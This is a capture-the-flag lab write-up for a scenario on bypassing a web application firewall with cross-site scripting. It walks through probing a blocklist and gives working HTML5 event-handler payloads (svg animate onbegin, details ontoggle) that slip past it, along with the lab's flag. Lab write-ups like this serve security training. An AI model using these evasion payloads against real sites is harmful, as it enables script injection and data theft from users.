# Scenario 15: Advanced WAF & Filter Bypass XSS

- **Port:** `8015`
- **Vulnerability:** Web Application Firewall & Filter Evasion XSS
- **Flag:** `CTF{w4f_byp4ss_h5_v3ct0r}`

## Exploitation Walkthrough
1. Access `http://<host>:8015/preview?rule=test`.
2. Test common payloads (`<script>`, `onerror=`, `onload=`, `"`) and observe WAF error signatures.
3. Identify that HTML5 events (e.g. `<svg><animate onbegin=...>`, `<details open ontoggle=...>`, `<body onpageshow=...>`) are not in the blocklist.
4. Craft an evasion vector without double quotes:
   ```html
   <svg><animate onbegin=document.getElementById('rule-flag').innerText=document.getElementById('waf-secret').value attributeName=x>
   ```
   Or:
   ```html
   <details open ontoggle=document.getElementById('rule-flag').innerText=document.getElementById('waf-secret').value>
   ```
5. Submit the payload via Burp Suite or URL to execute the script and capture the flag.
